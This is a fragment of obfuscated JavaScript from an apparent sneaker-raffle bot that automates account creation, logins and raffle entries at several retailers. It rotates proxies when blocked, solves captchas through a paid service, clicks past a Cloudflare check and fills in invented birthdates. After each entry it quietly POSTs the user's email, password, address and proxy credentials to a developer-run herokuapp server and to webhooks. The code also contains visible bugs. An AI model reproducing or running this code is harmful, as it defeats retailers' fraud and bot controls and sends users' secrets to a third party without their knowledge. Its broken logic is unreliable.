                                }), await _0x4b01dc(0x1388), await _0x4ac787['waitForSelector']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0x4ac787['focus']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0x4b01dc(0x1f4), console['log'](_0x303e65() + '\x20[' + _0x1b07f2['name'] + ']\x20Task\x20' + (_0x5827b2 + 0x1) + '\x20:\x20Logging\x20in'), await _0x4ac787['$eval']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb', _0x12d086 => _0x12d086['click']()), await _0x4ac787['click']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0x4ac787['click']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0x4b01dc(0x7d0), await _0x4ac787['waitForSelector']('#email-login'), await _0x4ac787['type']('#email-login', '' + _0x10c23f[_0x5827b2]['Email']['toLowerCase'](), { 'delay': 0xe6 }), await _0x4b01dc(0xdac), await _0x4ac787['waitForSelector']('#password'), await _0x4ac787['type']('#password', '' + _0x10c23f[_0x5827b2]['Password'], { 'delay': 0xe6 }), await _0x4b01dc(0x157c);
                                try {
                                    await _0x4ac787['$eval']('.login_accountInfo__FCIxY\x20>\x20button[type=\x22submit\x22]', _0x269845 => _0x269845['click']());
                                } catch {
                                }
                                try {
                                    await _0x4ac787['waitForSelector']('.swatchOptions_sizeTiles__Lizc2');
                                } catch (_0x12311c) {
                                }
                                await _0x4b01dc(0x3e8);
                                const _0x13894f = await _0x4ac787['$']('.enteredDraw_container__2KmQ_');
                                if (_0x13894f) {
                                    console['log']('Duplicate\x20entry,\x20skipping');
                                    return;
                                }
                                console['log'](_0x303e65() + '\x20[' + _0x1b07f2['name'] + ']\x20Task\x20' + (_0x5827b2 + 0x1) + '\x20:\x20Choosing\x20Size\x20' + _0x10c23f[_0x5827b2]['Size']);
                                try {
                                    if (_0x10c23f[_0x5827b2]['Size'] != 'RANDOM') {
                                        var _0x9bc638 = _0x10c23f[_0x5827b2]['Size']['replace']('.', ',');
                                        const _0x41f20e = await _0x4ac787['$x']('//div[contains(text(),\x20\x27' + _0x9bc638 + '\x27)]');
                                        await _0x41f20e[0x0]['click']();
                                    } else {
                                        const _0x25f90c = await _0x4ac787['$$']('div.swatchTile_tile__IRH9Q');
                                        var _0x3896a0 = Math['round'](Math['random']() * (_0x25f90c['length'] - 0x1));
                                        await _0x25f90c[_0x3896a0]['click']();
                                    }
                                } catch (_0x1d2257) {
                                    throw new Error('Softblocked,\x20Rotating\x20proxy');
                                }
                                await _0x4b01dc(0x1f4);
                                const _0x16f913 = await _0x4ac787['$']('.addressList_addressItem__LE2PB');
                                if (_0x16f913 && _0x10c23f[_0x5827b2]['Mode'] != 'NEW') {
                                } else
                                    console['log'](_0x303e65() + '\x20[' + _0x1b07f2['name'] + ']\x20Task\x20' + (_0x5827b2 + 0x1) + '\x20:\x20Filling\x20Address'), await _0x4ac787['click']('div.product_shipping__zEfqd\x20>\x20div\x20>\x20div.legend_legend__sQIiF\x20>\x20div.legend_header__iHZIh\x20>\x20div\x20>\x20button'), await _0x4b01dc(0x5dc), await _0x4ac787['waitForSelector']('#firstname'), await _0x4ac787['type']('#firstname', '' + _0x10c23f[_0x5827b2]['FirstName']), await _0x4b01dc(0x1f4), await _0x4ac787['waitForSelector']('#firstname'), await _0x4ac787['type']('#lastname', '' + _0x10c23f[_0x5827b2]['LastName']), await _0x4b01dc(0x1f4), await _0x4ac787['waitForSelector']('#firstname'), await _0x4ac787['type']('#street', '' + _0x10c23f[_0x5827b2]['Address1']), await _0x4b01dc(0x1f4), await _0x4ac787['waitForSelector']('#firstname'), await _0x4ac787['type']('#houseNumber', _0x10c23f[_0x5827b2]['HouseNumber'] + '\x20' + _0x10c23f[_0x5827b2]['Address2']), await _0x4b01dc(0x1f4), await _0x4ac787['waitForSelector']('#firstname'), await _0x4ac787['select']('#country_code', '' + _0x10c23f[_0x5827b2]['Country']), await _0x4b01dc(0x1f4), await _0x4ac787['type']('#postcode', '' + _0x10c23f[_0x5827b2]['Zip']), await _0x4b01dc(0x1f4), await _0x4ac787['type']('#city', '' + _0x10c23f[_0x5827b2]['City']), await _0x4b01dc(0x1f4), await _0x4ac787['type']('#telephone', '' + _0x10c23f[_0x5827b2]['Phone']), await _0x4b01dc(0x1f4), await _0x4ac787['click']('.addressModal_submit__dOiL4\x20>\x20button[type=\x22submit\x22]');
                                await _0x4b01dc(0x9c4);
                                try {
                                    await _0x4ac787['type']('#instagram_name', '' + _0x10c23f[_0x5827b2]['Follower']), await _0x4ac787['click']('.note_groupBtn__WLDwH\x20>\x20button');
                                } catch {
                                }
                                console['log'](_0x303e65() + '\x20[' + _0x1b07f2['name'] + ']\x20Task\x20' + (_0x5827b2 + 0x1) + '\x20:\x20Finishing\x20Entry'), await _0x4b01dc(0x5dc);
                                try {
                                    await _0x4ac787['click']('.checkBox_boxHolder__wLGVe');
                                } catch {
                                }
                                await _0x4b01dc(0x5dc), await _0x4ac787['$eval']('.termConditions_TC__hll9k\x20>\x20button', _0xd7546f => _0xd7546f['click']()), await _0x4b01dc(0x1388);
                                try {
                                    await _0x4ac787['waitForSelector']('.success_msg__2HjJY');
                                } catch {
                                    await _0x4ac787['reload']({ 'waitUntil': 'networkidle2' });
                                    if (_0x10c23f[_0x5827b2]['Size'] != 'RANDOM') {
                                        var _0x9bc638 = _0x10c23f[_0x5827b2]['Size']['replace']('.', ',');
                                        const _0x4ac127 = await _0x4ac787['$x']('//div[contains(text(),\x20' + _0x9bc638 + ')]');
                                        await _0x4ac127[0x0]['click']();
                                    } else {
                                        const _0x4c21ed = await _0x4ac787['$$']('div.swatchTile_tile__IRH9Q');
                                        var _0x3896a0 = Math['round'](Math['random']() * (_0x4c21ed['length'] - 0x1));
                                        await _0x4c21ed[_0x3896a0]['click']();
                                    }
                                    await _0x4b01dc(0x5dc);
                                    try {
                                        await _0x4ac787['hover']('#instagram_name'), await _0x4ac787['type']('#instagram_name', '' + _0x10c23f[_0x5827b2]['Follower']), await _0x4ac787['click']('.note_groupBtn__WLDwH\x20>\x20button');
                                    } catch {
                                    }
                                    console['log'](_0x303e65() + '\x20[' + _0x1b07f2['name'] + ']\x20Task\x20' + (_0x5827b2 + 0x1) + '\x20:\x20Retrying\x20(' + _0x50d769 + '\x20/\x205)');
                                    try {
                                        await _0x4ac787['hover']('.checkBox_boxHolder__wLGVe'), await _0x4b01dc(0x5dc), await _0x4ac787['click']('.checkBox_boxHolder__wLGVe');
                                    } catch {
                                    }
                                    await _0x4b01dc(0x157c), await _0x4ac787['$eval']('.termConditions_TC__hll9k\x20>\x20button', _0x571a7a => _0x571a7a['click']()), await _0x4b01dc(0x1388), await _0x4ac787['waitForSelector']('.success_msg__2HjJY');
                                }
                                _0x2df533 = 'no', _0x41d22(_0x10c23f[_0x5827b2], _0x1b07f2);
                                try {
                                    prxdata = {
                                        'username': _0x4ebc10['replace']('#', ''),
                                        'entrydata': JSON['stringify'](_0x384317),
                                        'proxy': '' + _0x498265[_0x5827b2]
                                    };
                                    var _0x2a7015 = JSON['stringify'](prxdata);
                                    let _0x2b2292 = { 'headers': { 'content-type': 'application/json' } };
                                    await _0x4f7750['post']('https://jraffles.herokuapp.com/success', _0x2a7015, _0x2b2292);
                                } catch (_0x3eb01c) {
                                }
                                console['log'](_0xd12810['green'](_0x303e65() + '\x20[' + _0x1b07f2['name'] + ']\x20Task\x20' + (_0x5827b2 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                                var _0x3f7c2f = await _0x4a5b92(_0x10c23f[_0x5827b2], _0x1b07f2, 'dev', ![]), _0x1b039a = await _0x4a5b92(_0x10c23f[_0x5827b2], _0x1b07f2, 'pub', ![]);
                                const _0x5a7209 = {
                                    'succesDEVMSG': { 'embeds': [_0x3f7c2f] },
                                    'succesPUBMSG': { 'embeds': [_0x1b039a] }
                                };
                                let _0x384317 = _0x10c23f[_0x5827b2];
                                try {
                                    prxdata = {
                                        'username': _0x4ebc10['replace']('#', ''),
                                        'module': _0x1b07f2['name'],
                                        'entrydata': JSON['stringify'](_0x384317),
                                        'proxy': '' + _0x498265[_0x5827b2]
                                    };
                                    var _0x2a7015 = JSON['stringify'](prxdata);
                                    let _0x3ace96 = { 'headers': { 'content-type': 'application/json' } };
                                    await _0x4f7750['post']('https://jraffles.herokuapp.com/success', _0x2a7015, _0x3ace96);
                                } catch (_0xa70dbc) {
                                }
                                try {
                                    _0x33c579['webhook'] != undefined && _0x33c579['webhook'] != '' && await _0x265172(_0x33c579['webhook'], _0x5a7209['succesDEVMSG']), await _0x4b01dc(0xc8), await _0x265172(_0x485a18, _0x5a7209['succesDEVMSG']), await _0x4b01dc(0xc8), await _0x265172(_0x2c2f0f, _0x5a7209['succesPUBMSG']);
                                } catch (_0xbad410) {
                                    console['log'](_0xd12810['yellow'](_0x303e65() + '\x20[' + _0x1b07f2['name'] + ']\x20Task\x20' + (_0x5827b2 + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0xbad410));
                                }
                            } catch (_0x23c2f2) {
                                console['log'](_0xd12810['red'](_0x303e65() + '\x20[' + _0x1b07f2['name'] + ']\x20Task\x20' + (_0x5827b2 + 0x1) + '\x20:\x20' + _0x23c2f2)), _0x2df533 = 'yes', _0x5ed8b7 = '' + _0x23c2f2;
                                var _0x2c1dce = await _0x4a5b92(_0x10c23f[_0x5827b2], _0x1b07f2, 'dev', !![], _0x5ed8b7), _0x3f7c2f = await _0x4a5b92(_0x10c23f[_0x5827b2], _0x1b07f2, 'dev', ![]), _0x1b039a = await _0x4a5b92(_0x10c23f[_0x5827b2], _0x1b07f2, 'pub', ![]);
                                const _0x14141c = {
                                    'succesDEVMSG': { 'embeds': [_0x3f7c2f] },
                                    'succesPUBMSG': { 'embeds': [_0x1b039a] }
                                };
                                _0x14141c['errorDEV'] = { 'embeds': [_0x2c1dce] }, _0x33c579['webhook'] != undefined && _0x33c579['webhook'] != '' && await _0x265172(_0x33c579['webhook'], _0x14141c['errorDEV']), await _0x265172(_0x3cc994, _0x14141c['errorDEV']);
                            } finally {
                                _0x550379 && _0x550379['close']();
                                if (_0x2df533 == 'yes' && _0x50d769 != 0x5)
                                    return console['log'](_0xd12810['red'](_0x303e65() + '\x20[' + _0x1b07f2['name'] + ']\x20Task\x20' + (_0x5827b2 + 0x1) + '\x20:\x20Retrying\x20(' + _0x50d769 + '\x20/\x205)')), _0x50d769 = _0x50d769 + 0x1, _0x2d0847--, _0x29551d(_0x1b07f2, _0x10c23f, _0x498265, _0x5827b2, _0x50d769);
                                _0x2df533 == 'yes' && _0x50d769 >= 0x5 && _0x2b505c(_0x10c23f[_0x5827b2], _0x1b07f2), !_0x144041 && (console['log'](_0x303e65() + '\x20[' + _0x1b07f2['name'] + ']\x20Waiting\x20for\x20' + _0x33c579['delay'] + '\x20ms'), await _0x4b01dc(_0x33c579['delay'])), _0x2d0847--;
                            }
                        }
                        _0x29551d(_0x4339c1, _0x48b7d9, _0x3ac088, _0x2fe022, 0x0), await _0x4b01dc(0x7d0);
                    }
                }
            },
            {
                'name': 'BSTN\x20Win\x20Checker',
                'store': 'BSTN',
                'logo': 'https://www.snkrempire.com/wp-content/uploads/2017/11/E3QHwMSP_400x400.png',
                'function': async function (_0x48490e, _0x519b8d) {
                    var _0x36d6f0 = 0x0, _0x398fd4;
                    try {
                        const _0x33ca40 = _0x3f6207['readFileSync']('../accounts/bstn.csv', 'utf-8');
                        _0x398fd4 = _0x3a0f5b['parse'](_0x33ca40, { 'header': !![] })['data'];
                    } catch (_0x1ce1bd) {
                        throw new Error('Error\x20reading\x20accounts/bstn.csv');
                    }
                    for (var _0x25f4e2 = 0x0; _0x25f4e2 < _0x398fd4['length']; _0x25f4e2++) {
                        maxTasks = Number(_0x33c579['threads']);
                        while (_0x36d6f0 >= maxTasks) {
                            await _0x4b01dc(_0x33c579['delay']);
                        }
                        async function _0x1531cf(_0x4eb120, _0x566189, _0x4ce890, _0x2196cd, _0x1ff348) {
                            _0x36d6f0++, _0x284c7b['use'](_0xecf9cb()), _0x284c7b['use'](_0x88e53d({
                                'provider': {
                                    'id': '2captcha',
                                    'token': '' + _0x33c579['captchaKey']
                                },
                                'visualFeedback': !![]
                            }));
                            if (_0x9d17fe != 'yes')
                                var _0x9d17fe = '', _0x1ff348 = 0x0;
                            var _0x252f34;
                            _0x369d34(_0x4eb120['name'] + '\x20Task\x20' + (_0x2196cd + 0x1) + '\x20/\x20' + _0x4ce890['length'] + '\x20||\x20File:\x20' + _0x506019 + '\x20Proxies:\x20' + _0x15bf3f);
                            var _0x26442a = await _0x4a5b92(_0x4ce890[_0x2196cd], _0x4eb120, 'acc', ![]);
                            const _0xb38912 = { 'succesDEVMSG': { 'embeds': [_0x26442a] } }, _0x47651b = 'https://www.bstn.com/eu_en/customer/account/create/';
                            var _0x50ac2f = Math['round'](Math['random']() * (_0x566189['length'] - 0x1)), _0x9a4879 = _0x566189[_0x50ac2f]['split'](':'), _0x18565d;
                            try {
                                _0x18565d = await _0x284c7b['launch']({
                                    'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                    'headless': !![],
                                    'args': [
                                        '--proxy-server=' + _0x9a4879[0x0] + ':' + _0x9a4879[0x1],
                                        '--no-sandbox',
                                        '--disable-setuid-sandbox'
                                    ]
                                });
                            } catch {
                                _0x18565d = await _0x284c7b['launch']({
                                    'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                    'headless': !![],
                                    'args': [
                                        '--proxy-server=' + _0x9a4879[0x0] + ':' + _0x9a4879[0x1],
                                        '--no-sandbox',
                                        '--disable-setuid-sandbox'
                                    ]
                                });
                            }
                            try {
                                console['log'](_0x303e65() + '\x20[' + _0x4eb120['name'] + ']\x20Task\x20' + (_0x2196cd + 0x1) + '\x20:\x20Checking\x20' + _0x4ce890[_0x2196cd]['Email']);
                                const _0x49c466 = await _0x18565d['newPage']();
                                await _0x49c466['authenticate']({
                                    'username': '' + _0x9a4879[0x2],
                                    'password': '' + _0x9a4879[0x3]
                                }), console['log'](_0x303e65() + '\x20[' + _0x4eb120['name'] + ']\x20Task\x20' + (_0x2196cd + 0x1) + '\x20:\x20Getting\x20Session'), await _0x49c466['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x49c466['setRequestInterception'](!![]), _0x49c466['on']('request', _0x246455 => {
                                    _0x246455['resourceType']() === 'image' ? _0x246455['abort']() : _0x246455['continue']();
                                });
                                try {
                                    await _0x49c466['goto']('https://www.bstn.com/eu_en/raffle/customer/', { 'waitUntil': 'networkidle2' }), await _0x49c466['waitForSelector']('button[class=\x22cf2Lf6\x22]');
                                } catch {
                                    _0x9d17fe = 'yes';
                                    throw new Error('Connection\x20Error');
                                }
                                await _0x49c466['click']('button[class=\x22cf2Lf6\x22]'), console['log'](_0x303e65() + '\x20[' + _0x4eb120['name'] + ']\x20Task\x20' + (_0x2196cd + 0x1) + '\x20:\x20Passing\x20Cloudflare'), await _0x4b01dc(0x3e8), await _0x49c466['type']('#email', _0x4ce890[_0x2196cd]['Email']), await _0x4b01dc(0x1f4), await _0x49c466['type']('#pass', _0x4ce890[_0x2196cd]['Password']), await _0x4b01dc(0x1f4), await _0x49c466['$eval']('#login-form', _0x5e8c30 => _0x5e8c30['submit']());
                                try {
                                    await _0x49c466['waitForSelector']('.product-items');
                                } catch {
                                    console['log'](_0x303e65() + '\x20[' + _0x4eb120['name'] + ']\x20Task\x20' + (_0x2196cd + 0x1) + '\x20:\x20No\x20Entries\x20Found');
                                    return;
                                }
                                await _0x4b01dc(0x190);
                                const _0x32883d = await _0x49c466['evaluate'](() => {
                                    const _0x258fa5 = Array['from'](document['querySelectorAll']('.product-item-photo\x20>\x20img'));
                                    return _0x258fa5['map'](_0x2c2841 => _0x2c2841['alt']);
                                }), _0x2d0613 = await _0x49c466['evaluate'](() => {
                                    const _0x55297b = Array['from'](document['querySelectorAll']('.tooltip.wrapper.product-item-tooltip.first-xs'));
                                    return _0x55297b['map'](_0x20e37a => _0x20e37a['innerHTML']);
                                }), _0x532fab = await _0x49c466['$$']('.raffle-winner');
                                if (_0x532fab['length'] < 0x1) {
                                    console['log'](_0x303e65() + '\x20[' + _0x4eb120['name'] + ']\x20Task\x20' + (_0x2196cd + 0x1) + '\x20:\x20No\x20Wins\x20Found'), _0x9d17fe = 'no';
                                    return;
                                }
                                console['log'](_0x303e65() + '\x20[' + _0x4eb120['name'] + ']\x20Task\x20' + (_0x2196cd + 0x1) + '\x20:\x20' + _0x532fab['length'] + '\x20Wins\x20Found!');
                                for (var _0x5938dd = 0x0; _0x5938dd < _0x532fab['length']; _0x5938dd++) {
                                    console['log'](_0xd12810['green'](_0x32883d[_0x5938dd] + _0x2d0613[_0x5938dd]['replace']('\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20', '')));
                                }
                            } catch (_0x49daa6) {
                                console['log'](_0xd12810['red'](_0x303e65() + '\x20[' + _0x4eb120['name'] + ']\x20Task\x20' + (_0x2196cd + 0x1) + '\x20:\x20' + _0x49daa6)), _0x252f34 = '' + _0x49daa6;
                                var _0x40610e = await _0x4a5b92(_0x4ce890[_0x2196cd], _0x4eb120, 'acc', !![], _0x252f34);
                                _0xb38912['errorDEV'] = { 'embeds': [_0x40610e] }, _0x33c579['webhook'] != undefined && _0x33c579['webhook'] != '' && await _0x265172(_0x33c579['webhook'], _0xb38912['errorDEV']), await _0x265172(_0x3cc994, _0xb38912['errorDEV']), _0x9d17fe = 'yes';
                            } finally {
                                if (_0x18565d)
                                    _0x18565d['close']();
                                if (_0x9d17fe == 'yes' && _0x1ff348 != 0x5)
                                    return console['log'](_0xd12810['red'](_0x303e65() + '\x20[' + _0x4eb120['name'] + ']\x20Task\x20' + (_0x2196cd + 0x1) + '\x20:\x20Retrying\x20(' + _0x1ff348 + '\x20/\x205)')), _0x36d6f0--, _0x1ff348 = _0x1ff348 + 0x1, _0x1531cf(_0x4eb120, _0x566189, _0x4ce890, _0x2196cd, _0x1ff348);
                                _0x9d17fe == 'yes' && _0x1ff348 >= 0x5 && (_0x2b505c(_0x4ce890[_0x2196cd], _0x4eb120), _0x9d17fe = 'no', _0x1ff348 = 0x0), console['log'](_0x303e65() + '\x20[' + _0x4eb120['name'] + ']\x20Waiting\x20for\x20' + _0x33c579['delay'] + '\x20ms'), await _0x4b01dc(_0x33c579['delay']), _0x36d6f0--;
                            }
                        }
                        _0x1531cf(_0x48490e, _0x519b8d, _0x398fd4, _0x25f4e2, 0x0), await _0x4b01dc(0x15e);
                    }
                }
            }
        ]
    },
    {
        'name': 'EQL',
        'modules': [{
            'name': 'EQL\x20Raffle\x20Entries',
            'store': 'EQL',
            'logo': 'https://res.cloudinary.com/crunchbase-production/image/upload/c_lpad,h_170,w_170,f_auto,b_white,q_auto:eco,dpr_1/qfc09zbor8py2zfmsdr2',
            'function': async function (_0x3806c7, _0x4a3791, _0x239a47) {
                _0x284c7b['use'](_0xecf9cb()), _0x284c7b['use'](_0x88e53d({
                    'provider': {
                        'id': '2captcha',
                        'token': '' + _0x33c579['captchaKey']
                    },
                    'visualFeedback': !![]
                }));
                for (var _0xe8fef4 = 0x0; _0xe8fef4 < _0x4a3791['length']; _0xe8fef4++) {
                    var _0x232bcb;
                    _0x369d34(_0x3806c7['name'] + '\x20Task\x20' + (_0xe8fef4 + 0x1) + '\x20/\x20' + _0x4a3791['length'] + '\x20||\x20File:\x20' + _0x506019 + '\x20Proxies:\x20' + _0x15bf3f);
                    try {
                        await _0x32ecbd(_0x4a3791, _0xe8fef4);
                    } catch {
                        _0x4aa750 = 'no';
                        throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                    }
                    async function _0x5683f7(_0x2dcfb6) {
                        const _0x40adf4 = _0x3f6207['readFileSync']('../successful-tasks.csv', 'utf8'), _0x979ee5 = _0x3a0f5b['parse'](_0x40adf4, { 'header': !![] })['data'];
                        let _0x6fe10a = ![];
                        for (var _0x13347b of _0x979ee5) {
                            if (_0x13347b['Url'] == _0x2dcfb6['Url'] && _0x13347b['Email'] == _0x2dcfb6['Email']) {
                                _0x6fe10a = !![];
                                break;
                            }
                        }
                        return _0x6fe10a;
                    }
                    if (await _0x5683f7(_0x4a3791[_0xe8fef4]) == !![]) {
                        console['log'](_0x303e65() + '\x20[' + _0x3806c7['name'] + ']\x20Task\x20' + (_0xe8fef4 + 0x1) + '\x20:\x20Task\x20Already\x20Entered,\x20Going\x20to\x20Next\x20Task');
                        continue;
                    }
                    var _0x3453ce = ![];
                    const _0x174d93 = _0x3f6207['readFileSync']('../accounts/eql.csv', 'utf8');
                    var _0xddc193 = _0x3a0f5b['parse'](_0x174d93, { 'header': !![] })['data'];
                    for (var _0x4aa50d of _0xddc193) {
                        _0x4aa50d['Email'] == _0x4a3791[_0xe8fef4]['Email'] && (_0x3453ce = !![]);
                    }
                    if (_0x3453ce == ![]) {
                        var _0x20a74c;
                        if (_0x4a3791[_0xe8fef4]['Url']['endsWith']('/')) {
                            _0x20a74c = _0x4a3791[_0xe8fef4]['Url'] + 'register';
                            if (_0x4aa750 != 'yes')
                                var _0x4aa750 = '', _0x42e828 = 0x0;
                        } else {
                            _0x20a74c = _0x4a3791[_0xe8fef4]['Url'] + '/register';
                            if (_0x4aa750 != 'yes')
                                var _0x4aa750 = '', _0x42e828 = 0x0;
                        }
                        if (_0x4a3791[_0xe8fef4]['Email'] == '' || _0x4a3791[_0xe8fef4]['FirstName'] == '' || _0x4a3791[_0xe8fef4]['LastName'] == '') {
                            console['log'](_0x303e65() + '\x20[' + _0x3806c7['name'] + ']\x20Task\x20' + (_0xe8fef4 + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        _0x4a3791[_0xe8fef4]['Password'] == '' && (_0x4a3791[_0xe8fef4]['Password'] = 'JRaffles23!');
                        if (_0x33c579['useRandomProxy'] = ![])
                            var _0x5df845 = _0x239a47[_0xe8fef4]['split'](':');
                        else
                            var _0xbe1c77 = Math['round'](Math['random']() * (_0x239a47['length'] - 0x1)), _0x5df845 = _0x239a47[_0xbe1c77]['split'](':');
                        var _0x26dabf;
                        try {
                            _0x26dabf = await _0x284c7b['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0x5df845[0x0] + ':' + _0x5df845[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x26dabf = await _0x284c7b['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0x5df845[0x0] + ':' + _0x5df845[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x46d9c9 = await _0x26dabf['newPage']();
                            await _0x46d9c9['authenticate']({
                                'username': '' + _0x5df845[0x2],
                                'password': '' + _0x5df845[0x3]
                            }), console['log'](_0x303e65() + '\x20[' + _0x3806c7['name'] + ']\x20Task\x20' + (_0xe8fef4 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x46d9c9['setRequestInterception'](!![]), _0x46d9c9['on']('request', _0x2f527b => {
                                _0x2f527b['resourceType']() === 'image' || _0x2f527b['resourceType']() === 'font' || _0x2f527b['resourceType']() === 'media' ? _0x2f527b['abort']() : _0x2f527b['continue']();
                            });
                            try {
                                await _0x46d9c9['goto']('' + _0x20a74c);
                            } catch {
                                throw new Error('Connection\x20Error');
                            }
                            console['log'](_0x303e65() + '\x20[' + _0x3806c7['name'] + ']\x20Task\x20' + (_0xe8fef4 + 0x1) + '\x20:\x20Setting\x20Credentials'), await _0x4b01dc(0x3e8), await _0x46d9c9['waitForSelector']('#email');
                            try {
                                try {
                                    await _0x46d9c9['click']('div[data-testid=\x22field-productVariantID\x22]'), await _0x4b01dc(0x3e8), _0x4a3791[_0xe8fef4]['Url']['includes']('en-GB') ? await _0x46d9c9['click']('li[data-value=\x22UK\x20' + _0x4a3791[_0xe8fef4]['Size'] + '\x20/\x20US\x20' + (Number(_0x4a3791[_0xe8fef4]['Size']) + 0x1) + '\x22]') : await _0x46d9c9['click']('li[data-value=\x22EU\x20' + _0x4a3791[_0xe8fef4]['Size'] + '\x22]');
                                } catch {
                                    await _0x46d9c9['click']('#productQuantity'), await _0x4b01dc(0x3e8), await _0x46d9c9['click']('li[data-value=\x22' + (Number(_0x4a3791[_0xe8fef4]['Size']) - 0x1) + '\x22]');
                                }
                            } catch {
                                throw new Error('Error\x20fetching\x20' + _0x4a3791[_0xe8fef4]['Size']);
                            }
                            await _0x4b01dc(0x6a4);
                            try {
                                await _0x46d9c9['select']('.PhoneInputCountrySelect', _0x4a3791[_0xe8fef4]['Country']);
                            } catch {
                            }
                            await _0x46d9c9['type']('#email', '' + _0x4a3791[_0xe8fef4]['Email']), await _0x4b01dc(0x352), await _0x46d9c9['waitForSelector']('#password'), await _0x46d9c9['type']('#password', '' + _0x4a3791[_0xe8fef4]['Password']), await _0x4b01dc(0x352), await _0x46d9c9['type']('#phone', '' + _0x4a3791[_0xe8fef4]['Phone']), await _0x4b01dc(0x352);
                            const _0x54b422 = await _0x46d9c9['$']('#title\x20>\x20label');
                            await _0x4b01dc(0x12c);
                            _0x54b422 && await _0x54b422['click']();
                            await _0x46d9c9['type']('#firstName', '' + _0x4a3791[_0xe8fef4]['FirstName']), await _0x4b01dc(0x352), await _0x46d9c9['type']('#lastName', '' + _0x4a3791[_0xe8fef4]['LastName']), await _0x4b01dc(0x352);
                            _0x4a3791[_0xe8fef4]['Url']['includes']('footlocker.de') ? await _0x46d9c9['type']('#birthdate', _0x54670f(0xa, 0x1c) + '.' + _0x54670f(0xa, 0xc) + '.' + _0x54670f(0x7c6, 0x7d3)) : await _0x46d9c9['type']('#birthdate', _0x54670f(0xa, 0x1c) + '-' + _0x54670f(0xa, 0xc) + '-' + _0x54670f(0x7c6, 0x7d3));
                            await _0x4b01dc(0x352), await _0x46d9c9['click']('.MuiBox-root.css-79elbk\x20>\x20button');
                            try {
                                !_0x4a3791[_0xe8fef4]['Url']['includes']('en-GB') && await _0x46d9c9['waitForSelector']('#stateAutocomplete');
                            } catch {
                                throw new Error('Connection\x20Error\x20fetching\x20shipping');
                            }
                            await _0x4b01dc(0x1f4), await _0x4b01dc(0x5dc);
                            if (!_0x20a74c['includes']('footlocker'))
                                try {
                                    await _0x46d9c9['click']('#country');
                                    const _0xcdfdc6 = await _0x46d9c9['$']('li[data-value=\x22' + _0x4a3791[_0xe8fef4]['Country'] + '\x22]');
                                    await _0xcdfdc6['click'](), await _0xcdfdc6['click']();
                                } catch {
                                    throw new Error('Country.\x20Please\x20use\x20exact\x20data\x20in\x20csv.\x20(Case\x20sensitive)');
                                }
                            await _0x4b01dc(0x3e8);
                            if (!_0x4a3791[_0xe8fef4]['Url']['includes']('en-GB')) {
                                await _0x46d9c9['click']('#stateAutocomplete'), await _0x4b01dc(0x5dc);
                                try {
                                    const _0x49dd43 = await _0x46d9c9['$x']('//li[text()=\x22' + _0x4a3791[_0xe8fef4]['State'] + '\x22]');
                                    await _0x49dd43[0x0]['click']();
                                } catch {
                                    throw new Error('State\x20/\x20Province\x20not\x20found.\x20Please\x20use\x20exact\x20data\x20in\x20csv.\x20(Case\x20sensitive)');
                                }
                            }
                            console['log'](_0x303e65() + '\x20[' + _0x3806c7['name'] + ']\x20Task\x20' + (_0xe8fef4 + 0x1) + '\x20:\x20Setting\x20Address'), await _0x4b01dc(0x3e8), await _0x4b01dc(0x1f4);
                            if (_0x4a3791[_0xe8fef4]['Url']['includes']('topps')) {
                                await _0x46d9c9['click']('#stateAutocomplete'), await _0x4b01dc(0x5dc);
                                try {
                                    const _0x2b5c18 = await _0x46d9c9['$x']('//li[text()=\x22' + _0x4a3791[_0xe8fef4]['State'] + '\x22]');
                                    await _0x2b5c18[0x0]['click']();
                                } catch {
                                    throw new Error('State\x20/\x20Province\x20not\x20found.\x20Please\x20use\x20exact\x20data\x20in\x20csv.\x20(Case\x20sensitive)');
                                }
                            }
